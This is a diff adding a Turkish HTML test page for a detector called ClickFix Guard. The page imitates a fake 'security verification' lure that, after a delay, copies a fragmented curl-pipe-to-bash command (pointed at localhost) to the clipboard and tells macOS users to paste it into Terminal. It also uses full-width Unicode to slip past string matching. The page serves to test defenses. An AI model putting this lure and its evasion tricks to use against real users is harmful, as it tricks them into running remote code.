@@ -1,0 +1,64 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8" />
+<title>Seviye 3 – Unicode Evasion + macOS Terminal</title>
+<style>
+  body { font: 15px/1.6 -apple-system, Segoe UI, sans-serif; max-width: 640px; margin: 60px auto; padding: 0 20px; }
+  .box { border: 1px solid #d0d0d0; border-radius: 8px; padding: 24px; }
+  code { background: #f2f2f2; padding: 10px; display: block; border-radius: 6px; word-break: break-all; }
+  .banner { background: #fff3cd; border: 1px solid #ffe08a; padding: 12px; border-radius: 6px; margin-bottom: 20px; }
+  .spinner { color: #666; }
+  #instructions { display: none; margin-top: 20px; }
+</style>
+</head>
+<body>
+  <div class="banner">
+    <strong>ClickFix Guard test sayfası – Seviye 3 (evasion).</strong> Bu sayfa iki kaçınma tekniğini
+    birden test eder: (1) görünür metinde tam-genişlik (full-width) unicode karakterler
+    kullanır — ör. "Ｔｅｒｍｉｎａｌ" — statik string eşleşmesini atlatmayı hedefler ama NFKC
+    normalizasyonuyla yakalanmalıdır; (2) talimatlar 3 saniyelik sahte bir "doğrulanıyor" gecikmesinden
+    sonra DOM'a enjekte edilir; (3) panoya yazılan komut JS içinde parçalar halinde birleştirilir,
+    yani sayfa kaynağında düz metin olarak görünmez — sadece çalışma zamanında pano hook'u yakalar.
+  </div>
+
+  <div class="box">
+    <h2>Ｇüvenlik Ｄoğrulaması</h2>
+    <p id="status" class="spinner">Doğrulanıyor, lütfen bekleyin…</p>
+
+    <div id="instructions">
+      <p>Doğrulama tamamlandı. macOS kullanıyorsanız:</p>
+      <ol>
+        <li>⌘ + Ｓｐａｃｅ ile Spotlight'ı açın, "Ｔｅｒｍｉｎａｌ" yazıp Enter'a basın</li>
+        <li>⌘ + V ile yapıştırın</li>
+        <li>Enter'a basın</li>
+      </ol>
+      <code id="cmd-display"></code>
+      <p style="color:#666; font-size:13px;">
+        Bu komut, aynı klasördeki zararsız <code>hello.sh</code> dosyasını yerel bir HTTP sunucudan
+        çekip çalıştırır (bkz. test-pages/README.md). Gerçek bir saldırıda bu adres saldırgan altyapısı olurdu.
+      </p>
+    </div>
+  </div>
+
+  <script>
+    const status = document.getElementById("status");
+    const instructions = document.getElementById("instructions");
+    const cmdDisplay = document.getElementById("cmd-display");
+
+    setTimeout(() => {
+      status.textContent = "Doğrulama tamamlandı.";
+      instructions.style.display = "block";
+
+      // Komut parçalar halinde birleştirilir; kaynak kodda tek bir düz metin
+      // olarak görünmez. Yine de clipboard.writeText çağrıldığı an
+      // injected.js bu değeri (birleşmiş haliyle) inceler ve yakalar.
+      const parts = ["cu", "rl -s http://localhost:8000/hello.sh | ", "ba", "sh"];
+      const payload = parts.join("");
+
+      cmdDisplay.textContent = payload;
+      navigator.clipboard.writeText(payload).catch(() => {});
+    }, 3000);
+  </script>
+</body>
+</html>
